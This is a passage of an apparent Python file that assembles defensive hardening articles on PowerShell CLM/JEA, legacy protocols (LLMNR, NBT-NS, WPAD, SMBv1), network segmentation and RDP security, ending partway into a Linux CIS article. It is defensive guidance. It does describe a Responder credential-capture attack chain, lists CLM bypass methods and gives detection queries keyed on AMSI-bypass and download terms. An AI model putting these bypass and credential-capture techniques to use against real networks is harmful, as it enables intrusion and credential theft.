            RoleCapabilities = "SOCAnalyst", "SOCLeadActions"
        }
    } `
    -TranscriptDirectory "C:\ProgramData\JEA\Transcripts" `
    -LanguageMode RestrictedLanguage
```

### Step 3: Register JEA Endpoint

```powershell
# Register on target servers
Register-PSSessionConfiguration -Name "SOCOperations" `
    -Path "$modulePath\SOCEndpoint.pssc" `
    -Force

# Restart WinRM to apply
Restart-Service WinRM
```

### Step 4: Use JEA Endpoint

```powershell
# SOC analyst connects to JEA endpoint
$session = New-PSSession -ComputerName "SERVER01" `
    -ConfigurationName "SOCOperations"

# Only allowed commands work
Invoke-Command -Session $session -ScriptBlock {
    Get-Process | Where-Object { $_.CPU -gt 50 }
}

# Blocked commands fail gracefully
Invoke-Command -Session $session -ScriptBlock {
    Stop-Service -Name "MSSQLSERVER"
    # Error: The term 'Stop-Service' is not recognized
}
```

## Verification Commands

```powershell
# === CLM Verification ===
# Check language mode
$ExecutionContext.SessionState.LanguageMode

# Test CLM is blocking .NET
try {
    [System.Net.WebClient]::new()
    Write-Host "CLM NOT active - .NET types allowed" -ForegroundColor Red
} catch {
    Write-Host "CLM active - .NET types blocked" -ForegroundColor Green
}

# === JEA Verification ===
# List registered JEA endpoints
Get-PSSessionConfiguration | Where-Object { $_.Permission -ne $null } |
    Select-Object Name, Permission

# Test JEA endpoint capabilities
$session = New-PSSession -ComputerName localhost -ConfigurationName "SOCOperations"
Invoke-Command -Session $session { Get-Command } |
    Select-Object Name, CommandType

# Check JEA transcripts
Get-ChildItem "C:\ProgramData\JEA\Transcripts" -Recurse |
    Sort-Object LastWriteTime -Descending | Select-Object -First 10
```

## Monitoring for Bypass

**CLM bypass attempts to detect:**

| Bypass Method | Detection |
|---|---|
| PowerShell v2 downgrade | Monitor for `powershell -version 2`; remove .NET 3.5 |
| Custom runspace creation | Script Block Logging captures attempt |
| PowerShell via .NET hosting | WDAC blocks unsigned executables |
| CLM env variable removal | WDAC-enforced CLM cannot be bypassed this way |

**Detection queries:**

```kql
DeviceProcessEvents
| where FileName == "powershell.exe" or FileName == "pwsh.exe"
| where ProcessCommandLine has "-version 2" or ProcessCommandLine has "-v 2"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

SecurityEvent
| where EventID == 4104   # Script Block Logging
| where Message has_any ("Reflection", "AmsiUtils", "WebClient", "Add-Type")
| project TimeGenerated, Computer, Account, Message
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| Command and Scripting Interpreter: PowerShell | T1059.001 | CLM blocks dangerous cmdlets |
| Reflective Code Loading | T1620 | CLM blocks Assembly.Load |
| Impair Defenses: Disable or Modify Tools | T1562.001 | CLM blocks AMSI bypass |
| Remote Services: WinRM | T1021.006 | JEA limits available commands |
| Abuse Elevation Control | T1548 | JEA virtual accounts limit privilege |

## Rollout Checklist

- [ ] Audit PowerShell usage across the environment
- [ ] Enable Script Block Logging and Module Logging everywhere
- [ ] Enable Transcription Logging to central share
- [ ] Remove PowerShell v2 and .NET Framework 3.5
- [ ] Deploy WDAC to enforce CLM for unsigned scripts
- [ ] Sign administrative scripts with code-signing certificate
- [ ] Define JEA role capabilities for each admin role
- [ ] Deploy JEA endpoints on sensitive servers
- [ ] Test all administrative workflows in CLM/JEA
- [ ] Monitor for bypass attempts in SIEM
"""
    ))

    # -------------------------------------------------------------------------
    # Article 12: Disabling Legacy Protocols (LLMNR, NBT-NS, WPAD, SMBv1)
    # -------------------------------------------------------------------------
    articles.append((
        "Disabling Legacy Protocols (LLMNR, NBT-NS, WPAD, SMBv1)",
        ["hardening", "legacy-protocols", "llmnr", "netbios", "smb", "defense", "network"],
        r"""# Disabling Legacy Protocols: LLMNR, NBT-NS, WPAD, SMBv1

## Why This Matters

Legacy network protocols are a goldmine for attackers. LLMNR and NBT-NS respond to broadcast name resolution queries, allowing any host on the subnet to impersonate any other host and capture authentication credentials. WPAD allows attackers to inject a malicious proxy configuration. SMBv1 contains unfixable vulnerabilities (EternalBlue/WannaCry). These protocols exist for backward compatibility but are actively exploited in virtually every internal penetration test.

**Attack chain using legacy protocols:**

```
1. Attacker runs Responder on the network
2. Victim's machine sends LLMNR/NBT-NS broadcast for a mistyped hostname
3. Responder replies: "That's me!" and requests authentication
4. Victim automatically sends NTLMv2 hash
5. Attacker cracks hash offline or relays it to another host
6. Attacker has valid credentials -> lateral movement
```

**Impact of each protocol:**

| Protocol | Risk | Used By | Safe to Disable |
|---|---|---|---|
| LLMNR | Credential capture via Responder | Name resolution fallback | Yes in most environments |
| NBT-NS | Credential capture, NBNS spoofing | Legacy NetBIOS apps | Yes in most environments |
| WPAD | Proxy hijacking, credential theft | Auto proxy discovery | Yes (configure proxy via GPO) |
| SMBv1 | EternalBlue, WannaCry, relay attacks | Very old systems (XP, 2003) | Yes unless legacy deps exist |
| NTLMv1 | Trivially crackable hashes | Legacy applications | Yes, enforce NTLMv2 minimum |

## Implementation Steps

### Step 1: Disable LLMNR

**Via Group Policy:**

```
Computer Configuration > Administrative Templates > Network > DNS Client

Turn off multicast name resolution = Enabled
```

**Via Registry:**

```powershell
# Disable LLMNR
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
```

### Step 2: Disable NBT-NS (NetBIOS over TCP/IP)

**Via GPO (DHCP option):**

Configure DHCP to set NetBIOS node type to P-node (peer-to-peer, no broadcasts):

```
DHCP Server > Scope Options > Advanced
Option 001: Microsoft Disable Netbios Option = 0x2
Option 046: WINS/NBT Node Type = 0x2 (P-node)
```

**Via PowerShell (per-interface):**

```powershell
# Disable NetBIOS on all interfaces
Get-WmiObject Win32_NetworkAdapterConfiguration |
    Where-Object { $_.IPEnabled -eq $true } |
    ForEach-Object {
        $_.SetTcpipNetbios(2)  # 2 = Disable NetBIOS
    }

# Verify
Get-WmiObject Win32_NetworkAdapterConfiguration |
    Where-Object { $_.IPEnabled } |
    Select-Object Description, TcpipNetbiosOptions
# 0 = Default, 1 = Enable, 2 = Disable
```

**Via Registry (per-interface, for GPO deployment):**

```powershell
# Get all network interface GUIDs
$interfaces = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"

foreach ($iface in $interfaces) {
    Set-ItemProperty -Path $iface.PSPath -Name "NetbiosOptions" -Value 2 -Type DWord
}
```

### Step 3: Disable WPAD

**Via Group Policy:**

```
Computer Configuration > Administrative Templates > Windows Components >
  Internet Explorer > Disable caching of Auto-Proxy scripts = Enabled

User Configuration > Administrative Templates > Windows Components >
  Internet Explorer > Automatic configuration > Disable AutoProxy = Enabled
```

**Prevent WPAD DNS queries:**

```powershell
# Add WPAD to the DNS block list on your DNS server
Add-DnsServerQueryResolutionPolicy -Name "Block-WPAD" `
    -Action DENY `
    -FQDN "eq,wpad.*" `
    -ProcessingOrder 1

# Or create a DNS zone for wpad
Add-DnsServerPrimaryZone -Name "wpad" -ZoneFile "wpad.dns"
# Point to a non-existent or controlled IP
```

**Block WPAD via hosts file (endpoint):**

```powershell
# GPO script or ConfigMgr baseline
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "0.0.0.0 wpad"
Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "0.0.0.0 wpad.contoso.com"
```

**Disable WinHTTP AutoProxy service:**

```powershell
Set-Service -Name "WinHttpAutoProxySvc" -StartupType Disabled
Stop-Service -Name "WinHttpAutoProxySvc" -Force
```

### Step 4: Disable SMBv1

```powershell
# Detect SMBv1 usage first (audit for 30 days)
Set-SmbServerConfiguration -AuditSmb1Access $true

# Check audit log for SMBv1 clients
Get-WinEvent -LogName "Microsoft-Windows-SMBServer/Audit" |
    Where-Object { $_.Id -eq 3000 } |
    Select-Object TimeCreated, Message

# Disable SMBv1 server
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Disable SMBv1 client
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -NoRestart

# Verify SMBv1 is disabled
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
Get-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" |
    Select-Object State
```

**Via GPO:**

```
Computer Configuration > Administrative Templates > Network >
  Lanman Server

SMB 1.0/CIFS File Sharing Support:
  SMB 1.0/CIFS Client = Disabled
  SMB 1.0/CIFS Server = Disabled
```

### Step 5: Enforce NTLMv2 Only

```
Computer Configuration > Policies > Windows Settings > Security Settings >
  Local Policies > Security Options

Network security: LAN Manager authentication level =
  Send NTLMv2 response only. Refuse LM & NTLM

Network security: Minimum session security for NTLM SSP clients =
  Require NTLMv2 session security, Require 128-bit encryption

Network security: Minimum session security for NTLM SSP servers =
  Require NTLMv2 session security, Require 128-bit encryption
```

```powershell
# Registry equivalent
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 5 /f
```

## Verification Commands

```powershell
# === LLMNR ===
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast
# Should be 0

# === NBT-NS ===
Get-WmiObject Win32_NetworkAdapterConfiguration |
    Where-Object { $_.IPEnabled } |
    Select-Object Description, TcpipNetbiosOptions
# All should show 2

# === WPAD ===
Resolve-DnsName "wpad" -ErrorAction SilentlyContinue
Resolve-DnsName "wpad.contoso.com" -ErrorAction SilentlyContinue
# Both should fail or resolve to 0.0.0.0

# === SMBv1 ===
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
# Should be False

Get-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"
# State should be Disabled

# === NTLMv2 ===
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel
# Should be 5

# === Full validation scan ===
# Run Responder in analyze mode to verify no responses
# python3 Responder.py -I eth0 -A  (analyze only, no poisoning)
```

## Monitoring for Bypass

| Scenario | Detection |
|---|---|
| Responder/Inveigh on network | LLMNR/NBT-NS packets from unexpected hosts |
| WPAD still resolving | DNS query logs for "wpad" queries |
| SMBv1 re-enabled | Registry monitoring for EnableSMB1Protocol |
| NTLM downgrade attack | Event ID 4624 with NTLMv1 in Package field |

**Detection query for NTLM downgrade:**

```kql
SecurityEvent
| where EventID == 4624
| where AuthenticationPackageName == "NTLM"
| where LmPackageName == "NTLM V1"
| project TimeGenerated, Account, Computer, IpAddress, LmPackageName
```

**Detection for Responder activity:**

```kql
// Unusual LLMNR/NBT-NS traffic patterns
NetworkConnectionEvents
| where RemotePort in (5355, 137)
| summarize ResponseCount=count() by RemoteIP, bin(TimeGenerated, 5m)
| where ResponseCount > 50
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| LLMNR/NBT-NS Poisoning | T1557.001 | Disable LLMNR and NBT-NS |
| WPAD Poisoning | T1557.001 | Disable WPAD auto-discovery |
| Exploitation of Remote Services | T1210 | Disable SMBv1 (EternalBlue) |
| Forced Authentication | T1187 | NTLMv2-only + LLMNR disabled |
| Man-in-the-Middle | T1557 | All legacy protocol mitigations |

## Rollout Checklist

- [ ] Audit LLMNR, NBT-NS, and WPAD traffic for 2 weeks
- [ ] Identify any legitimate dependencies on legacy protocols
- [ ] Deploy LLMNR disable GPO
- [ ] Configure DHCP to disable NetBIOS (P-node)
- [ ] Deploy WPAD disable GPO and DNS block
- [ ] Audit SMBv1 usage for 30 days
- [ ] Disable SMBv1 on all systems
- [ ] Enforce NTLMv2-only authentication
- [ ] Verify with Responder in analyze mode
- [ ] Monitor for re-enablement and bypass attempts
"""
    ))

    # -------------------------------------------------------------------------
    # Article 13: Segmentation and Microsegmentation for Lateral Movement Prevention
    # -------------------------------------------------------------------------
    articles.append((
        "Segmentation and Microsegmentation for Lateral Movement Prevention",
        ["network", "segmentation", "microsegmentation", "lateral-movement", "defense", "zero-trust"],
        r"""# Segmentation and Microsegmentation for Lateral Movement Prevention

## Why This Matters

Network segmentation is the practice of dividing a network into isolated zones to contain breaches and prevent lateral movement. Once an attacker gains initial access to a single endpoint, a flat network allows them to reach every server, database, and critical system without restriction. Segmentation forces attackers through chokepoints where traffic can be inspected and blocked. **Microsegmentation** takes this further by applying per-workload or per-application policies, effectively creating a firewall around every individual system.

**Flat network vs segmented:**

| Scenario | Flat Network | Segmented Network |
|---|---|---|
| Compromised workstation | Can reach all servers, DCs, databases | Can only reach approved services |
| Ransomware propagation | Spreads to entire network in minutes | Contained to one segment |
| Lateral movement cost | Trivial - direct SMB/RDP access | High - must bypass firewall rules |
| Data exfiltration | Direct path to file servers | Must traverse multiple zones |
| Blast radius | Entire organization | Single segment |

## Segmentation Architecture

### Zone Design

```
 +------------------+     +------------------+     +------------------+
 |   User Zone      |     |  Server Zone     |     |  Management Zone |
 |  VLAN 10-29      |     |  VLAN 100-129    |     |  VLAN 200-209   |
 |  10.1.0.0/16     |     |  10.100.0.0/16   |     |  10.200.0.0/24  |
 |                  |     |                  |     |                  |
 | - Workstations   |     | - App servers    |     | - PAWs           |
 | - Laptops        |     | - DB servers     |     | - Jump servers   |
 | - BYOD           |     | - File servers   |     | - SIEM           |
 +--------+---------+     +--------+---------+     +--------+---------+
          |                         |                         |
          +------------+------------+------------+------------+
                       |                         |
              +--------+---------+      +--------+---------+
              |  Core Firewall   |      |   DMZ Zone       |
              |  (L3/L4 + L7)   |      |   VLAN 250       |
              +--------+---------+      |   172.16.0.0/24  |
                       |                |                  |
              +--------+---------+      | - Web servers    |
              |  Internet Edge   |      | - Email gateway  |
              |  Firewall/IPS    |      | - VPN endpoint   |
              +------------------+      +------------------+
```

### Zone Trust Levels

| Zone | Trust Level | Allowed Inbound | Allowed Outbound |
|---|---|---|---|
| Management | Highest | From PAWs only | To all zones (admin) |
| Identity (DCs) | Critical | Kerberos, LDAP, DNS | Replication only |
| Database | High | From app servers only | Logging, backup |
| Application | Medium | From user zone via LB | To DB, external APIs |
| User | Low | From management only | To app zone, internet |
| DMZ | Lowest | From internet (limited) | To app zone (limited) |
| Guest/IoT | Untrusted | None | Internet only |

## Implementation Steps

### Step 1: Network Discovery and Flow Mapping

```powershell
# Collect network flow data to understand traffic patterns
# Use NetFlow/IPFIX data to map actual communications

# PowerShell: Export current connections from servers
Get-NetTCPConnection -State Established |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Export-Csv C:\NetworkFlows.csv

# Map process to connections
Get-NetTCPConnection -State Established |
    ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            LocalAddress = $_.LocalAddress
            LocalPort = $_.LocalPort
            RemoteAddress = $_.RemoteAddress
            RemotePort = $_.RemotePort
            ProcessName = $proc.ProcessName
            ProcessPath = $proc.Path
        }
    } | Export-Csv C:\NetworkFlowsWithProcess.csv
```

### Step 2: VLAN Configuration

**Cisco switch VLAN setup:**

```
! Create VLANs
vlan 10
 name Users-Floor1
vlan 11
 name Users-Floor2
vlan 100
 name Servers-App
vlan 110
 name Servers-DB
vlan 200
 name Management
vlan 250
 name DMZ

! Assign access ports
interface GigabitEthernet0/1
 switchport mode access
 switchport access vlan 10
 switchport port-security maximum 2
 spanning-tree portfast

! Trunk to firewall
interface GigabitEthernet0/48
 switchport mode trunk
 switchport trunk allowed vlan 10,11,100,110,200,250
```

### Step 3: Inter-VLAN Firewall Rules

**Palo Alto firewall policy (conceptual):**

```
# User Zone -> Application Zone
allow users -> app-servers tcp/443,8443 (HTTPS only)
allow users -> file-servers tcp/445 (SMB, with user auth)
deny  users -> app-servers any (block all other)

# Application Zone -> Database Zone
allow app-servers -> db-servers tcp/1433,3306,5432 (SQL ports only)
deny  app-servers -> db-servers any

# User Zone -> User Zone (block lateral movement!)
deny  users -> users tcp/445,3389,5985,135 (block SMB, RDP, WinRM, RPC)
allow users -> users icmp (optional, for troubleshooting)

# Management Zone -> All Zones
allow management -> all tcp/3389,5985,22 (RDP, WinRM, SSH)
allow management -> identity-zone tcp/389,636,88 (LDAP, Kerberos)

# Identity Zone isolation
allow all -> identity-zone tcp/389,636,88,53 udp/389,88,53 (essential services)
deny  all -> identity-zone any (block everything else)

# Internet access
allow users -> internet tcp/80,443 (via proxy)
deny  servers -> internet any (no direct internet for servers)
allow dmz -> internet tcp/80,443 (limited)
```

### Step 4: Microsegmentation with Host-Based Firewall

```powershell
# Windows Firewall microsegmentation rules
# Apply via GPO per server role

# === Database Server Profile ===
# Block all inbound by default
Set-NetFirewallProfile -Profile Domain -DefaultInboundAction Block

# Allow SQL from app servers only
New-NetFirewallRule -DisplayName "Allow SQL from App Servers" `
    -Direction Inbound -Protocol TCP -LocalPort 1433 `
    -RemoteAddress "10.100.0.0/24" -Action Allow

# Allow management from PAWs only
New-NetFirewallRule -DisplayName "Allow RDP from Management" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress "10.200.0.0/24" -Action Allow

# Allow monitoring
New-NetFirewallRule -DisplayName "Allow WinRM from SIEM" `
    -Direction Inbound -Protocol TCP -LocalPort 5985 `
    -RemoteAddress "10.200.0.10" -Action Allow

# Block everything else (default deny covers this)

# === Workstation Profile ===
# Block workstation-to-workstation SMB (prevents lateral movement)
New-NetFirewallRule -DisplayName "Block SMB from Workstations" `
    -Direction Inbound -Protocol TCP -LocalPort 445 `
    -RemoteAddress "10.1.0.0/16" -Action Block

# Block RDP from other workstations
New-NetFirewallRule -DisplayName "Block RDP from Workstations" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress "10.1.0.0/16" -Action Block
```

### Step 5: Zero Trust Network Access (ZTNA) for Applications

```yaml
# Example: Cloudflare Access or Zscaler ZPA policy
# Replaces VPN with per-application access control

policies:
  - name: "Internal HR Application"
    application: "hr.internal.contoso.com"
    allowed_groups:
      - "HR-Department"
      - "HR-Managers"
    require:
      - identity_provider: "Okta"
      - device_posture: "managed_device"
      - mfa: true
    network_policy:
      destination: "10.100.50.10:443"
      protocol: "HTTPS"

  - name: "Database Admin Portal"
    application: "dbadmin.internal.contoso.com"
    allowed_groups:
      - "Database-Admins"
    require:
      - identity_provider: "Okta"
      - device_posture: "paw_device"
      - mfa: true
      - geo_restriction: "US-only"
```

## Verification Commands

```powershell
# Verify VLAN assignment
Get-NetAdapter | Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength

# Test segmentation from workstation
Test-NetConnection -ComputerName "db-server.contoso.com" -Port 1433
# Should FAIL from user VLAN (only app servers allowed)

Test-NetConnection -ComputerName "app-server.contoso.com" -Port 443
# Should SUCCEED from user VLAN

# Test workstation-to-workstation block
Test-NetConnection -ComputerName "10.1.0.50" -Port 445
# Should FAIL (SMB blocked between workstations)

# Verify firewall rules
Get-NetFirewallRule -Direction Inbound -Action Block |
    Select-Object DisplayName, Enabled, Profile |
    Format-Table -AutoSize
```

```
# Verify from network device (Cisco)
show vlan brief
show ip access-list
show run | section policy-map
```

## Monitoring for Bypass

| Bypass Attempt | Detection |
|---|---|
| VLAN hopping (double tagging) | IDS alert on 802.1Q-in-802.1Q |
| Firewall rule misconfiguration | Automated rule audit scripts |
| Pivot through allowed service | Application-layer inspection (L7 firewall) |
| Tunnel through DNS/HTTPS | DNS monitoring + TLS inspection |
| Rogue switch/AP | 802.1X NAC, DHCP snooping |

```kql
// Detect cross-zone connections that should not exist
NetworkConnectionEvents
| where SourceSubnet != DestinationSubnet
| where DestinationPort in (445, 3389, 22, 5985)
| where not (SourceSubnet == "10.200.0.0/24")  // management is allowed
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| Lateral Movement: SMB/Windows Admin Shares | T1021.002 | Block SMB between zones |
| Remote Desktop Protocol | T1021.001 | RDP only from management zone |
| Exploitation of Remote Services | T1210 | Limit exposed services per zone |
| Internal Proxy | T1090.001 | L7 inspection at zone boundaries |
| Exfiltration Over Web Service | T1567 | Servers denied direct internet |

## Rollout Checklist

- [ ] Map all network traffic flows for 30 days
- [ ] Design zone architecture based on asset criticality
- [ ] Configure VLANs and inter-VLAN routing
- [ ] Deploy firewall rules between zones (start with logging only)
- [ ] Block workstation-to-workstation SMB and RDP
- [ ] Deploy host-based firewall policies via GPO
- [ ] Validate all business applications work through segmentation
- [ ] Implement microsegmentation for critical servers
- [ ] Enable 802.1X for dynamic VLAN assignment
- [ ] Quarterly segmentation rule audit and penetration test
"""
    ))

    # -------------------------------------------------------------------------
    # Article 14: Securing Remote Desktop Services
    # -------------------------------------------------------------------------
    articles.append((
        "Securing Remote Desktop Services",
        ["hardening", "rdp", "remote-desktop", "windows", "defense", "lateral-movement"],
        r"""# Securing Remote Desktop Services

## Why This Matters

Remote Desktop Protocol (RDP) is one of the most exploited services in enterprise environments. It is the most common initial access vector for ransomware groups, who either brute-force exposed RDP or use stolen credentials to log in directly. Even internally, RDP provides attackers with a convenient lateral movement path. Securing RDP is critical because it provides full interactive desktop access, making it extremely valuable to attackers.

**RDP threat landscape:**

| Threat | Description | Frequency |
|---|---|---|
| Brute force from internet | Attackers scan for port 3389 and try password lists | Constant |
| Credential stuffing | Using leaked credentials against RDP | Very common |
| BlueKeep (CVE-2019-0708) | Pre-auth RCE in older RDP | Still exploited |
| RDP session hijacking | Attacker takes over disconnected sessions | Post-compromise |
| RDP as lateral movement | Moving between internal systems via RDP | Very common |
| Man-in-the-middle | Intercepting RDP sessions without NLA | Moderate |

## Implementation Steps

### Step 1: Remove RDP from the Internet

**This is non-negotiable.** RDP should never be directly exposed to the internet.

```powershell
# Check if RDP is exposed externally
# From your firewall/perimeter, verify no NAT rules for 3389

# Use shodan or censys to check your public IPs
# https://www.shodan.io/search?query=port%3A3389+org%3A%22Your+Org%22

# Alternative access methods:
# - VPN + RDP (minimum)
# - RD Gateway (better)
# - Azure AD Application Proxy or similar (best)
# - Jump server / bastion host
```

### Step 2: Deploy RD Gateway

```powershell
# Install RD Gateway role
Install-WindowsFeature -Name RDS-Gateway -IncludeManagementTools

# Configure RD Gateway policies via Server Manager:
# Connection Authorization Policy (CAP):
#   - Require "Remote Desktop Users" group membership
#   - Require device authentication or NAP
#   - Require smart card or MFA

# Resource Authorization Policy (RAP):
#   - Restrict which internal servers users can connect to
#   - Map to AD security groups
```

**RD Gateway connection via GPO:**

```
Computer Configuration > Administrative Templates > Windows Components >
  Remote Desktop Services > Remote Desktop Connection Client

Specify RD Gateway server address = rdgw.contoso.com
Set RD Gateway authentication method = Ask for credentials, use NTLM
Do not allow RD Gateway bypass for local addresses = Enabled
```

### Step 3: Enable Network Level Authentication (NLA)

NLA requires authentication before the RDP session is established, preventing unauthenticated resource consumption and pre-auth exploits.

```powershell
# Enable NLA via GPO
# Computer Configuration > Administrative Templates > Windows Components >
#   Remote Desktop Services > Remote Desktop Session Host > Security
#   Require user authentication for remote connections by using NLA = Enabled

# Via Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f

# Via PowerShell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
    -Name "UserAuthentication" -Value 1

# Verify NLA is enabled
(Get-WmiObject -Class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices).UserAuthenticationRequired
# Should return 1
```

### Step 4: Restrict RDP Access

```powershell
# Remove "Everyone" and "Authenticated Users" from Remote Desktop Users
# Only specific groups should have RDP access

# GPO: Computer Configuration > Windows Settings > Security Settings >
#   Local Policies > User Rights Assignment
#   Allow log on through Remote Desktop Services = Tier2-HelpDesk, Tier1-ServerAdmins

# Deny RDP for high-privilege accounts on lower tiers
# Deny log on through Remote Desktop Services = Domain Admins, Enterprise Admins

# Restrict RDP via Windows Firewall
New-NetFirewallRule -DisplayName "Allow RDP from Management Only" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress "10.200.0.0/24" -Action Allow -Profile Domain

New-NetFirewallRule -DisplayName "Block RDP from All Others" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -Action Block -Profile Domain
```

### Step 5: Harden RDP Session Security

```
# GPO: Computer Configuration > Administrative Templates > Windows Components >
#   Remote Desktop Services > Remote Desktop Session Host > Security

# Set encryption level
Set client connection encryption level = High Level

# Require TLS for RDP transport
Require use of specific security layer for remote connections = SSL

# Set minimum encryption
Set minimum encryption level for remote connections = High

# Configure session timeouts
# Session Host > Session Time Limits
Set time limit for disconnected sessions = 15 minutes
Set time limit for active but idle sessions = 30 minutes
End session when time limits are reached = Enabled
```

```powershell
# Disable clipboard redirection (prevents data exfiltration)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableClip /t REG_DWORD /d 1 /f

# Disable drive redirection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCdm /t REG_DWORD /d 1 /f

# Disable printer redirection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCpm /t REG_DWORD /d 1 /f

# Disable COM port redirection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCcm /t REG_DWORD /d 1 /f
```

### Step 6: Enable RDP-Specific Logging

```powershell
# Enable detailed RDP logging
wevtutil sl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" /e:true
wevtutil sl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" /e:true

# Key Event IDs to monitor:
# 1149 = RDP authentication succeeded (RemoteConnectionManager)
# 21   = Session logon succeeded (LocalSessionManager)
# 23   = Session logoff (LocalSessionManager)
# 24   = Session disconnected (LocalSessionManager)
# 25   = Session reconnected (LocalSessionManager)
# 4624 = Logon (Type 10 = RDP) in Security log
# 4625 = Failed logon attempt
```

### Step 7: Implement Account Lockout

```
# GPO: Computer Configuration > Windows Settings > Security Settings >
#   Account Policies > Account Lockout Policy

Account lockout threshold = 5 invalid logon attempts
Account lockout duration = 30 minutes
Reset account lockout counter after = 30 minutes

# GPO: Computer Configuration > Windows Settings > Security Settings >
#   Account Policies > Password Policy

Minimum password length = 14 characters
Password must meet complexity requirements = Enabled
```

## Verification Commands

```powershell
# Check RDP is enabled and NLA is required
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections
# 0 = RDP enabled, 1 = RDP disabled

Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication
# 1 = NLA required

# Check RDP security layer
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name SecurityLayer
# 2 = TLS/SSL required

# List who can RDP
Get-LocalGroupMember "Remote Desktop Users"

# Check firewall rules for RDP
Get-NetFirewallRule -DisplayName "*Remote Desktop*" |
    Select-Object DisplayName, Enabled, Action, Direction

# Verify RD Gateway (if installed)
Get-RemoteDesktopGateway
```

```bash
# External check - verify 3389 is NOT exposed
nmap -p 3389 your-public-ip
# Should show filtered or closed
```

## Monitoring for Bypass

| Attack | Detection |
|---|---|
| Brute force | Multiple 4625 events from same source |
| Pass the hash via RDP | Restricted Admin mode usage (Event 4624, Logon Type 10) |
| RDP session hijacking | tscon.exe usage by non-SYSTEM |
| Tunneled RDP (SSH, Chisel) | RDP on non-standard ports; outbound SSH from servers |
| SharpRDP (fileless RDP) | Process creation via mstscax.dll |

**Detection queries:**

```kql
// RDP brute force detection
SecurityEvent
| where EventID == 4625
| where LogonType == 10
| summarize FailCount=count(), TargetAccounts=make_set(TargetUserName)
    by IpAddress, bin(TimeGenerated, 10m)
| where FailCount > 10

// RDP session hijacking detection
DeviceProcessEvents
| where FileName == "tscon.exe"
| where InitiatingProcessAccountName != "SYSTEM"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// Successful RDP from unusual source
SecurityEvent
| where EventID == 4624 and LogonType == 10
| where IpAddress !startswith "10.200."  // Not from management zone
| project TimeGenerated, Account, Computer, IpAddress
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| Remote Desktop Protocol | T1021.001 | NLA, Gateway, MFA, segmentation |
| Brute Force: Password Guessing | T1110.001 | Account lockout, monitoring |
| Exploitation of Remote Services | T1210 | Patching, NLA prevents pre-auth exploits |
| Remote Service Session Hijacking | T1563.002 | Session timeouts, tscon monitoring |
| Valid Accounts | T1078 | MFA, Restricted Admin mode |

## Rollout Checklist

- [ ] Verify RDP is NOT exposed to the internet
- [ ] Deploy RD Gateway or VPN for remote RDP access
- [ ] Enable Network Level Authentication (NLA) on all systems
- [ ] Restrict RDP access to specific security groups
- [ ] Block RDP between workstations (lateral movement)
- [ ] Enable TLS encryption for RDP sessions
- [ ] Configure session timeouts (idle and disconnected)
- [ ] Disable clipboard, drive, and printer redirection where not needed
- [ ] Implement account lockout policy
- [ ] Enable RDP-specific event logging and SIEM alerting
"""
    ))

    # -------------------------------------------------------------------------
    # Article 15: Linux Server Hardening CIS Benchmark Walkthrough
    # -------------------------------------------------------------------------
    articles.append((
        "Linux Server Hardening CIS Benchmark Walkthrough",
        ["hardening", "linux", "cis-benchmark", "defense", "server", "compliance"],
        r"""# Linux Server Hardening: CIS Benchmark Walkthrough

## Why This Matters

Linux servers host critical infrastructure including web applications, databases, DNS, and container orchestration platforms. A default Linux installation includes many services and configurations that prioritize convenience over security. The Center for Internet Security (CIS) Benchmarks provide consensus-based hardening standards. Following CIS Level 1 (practical security for most environments) and Level 2 (defense in depth for sensitive systems) dramatically reduces the attack surface.

**Common Linux server compromises:**

| Attack Vector | Default Risk | CIS Control |
|---|---|---|
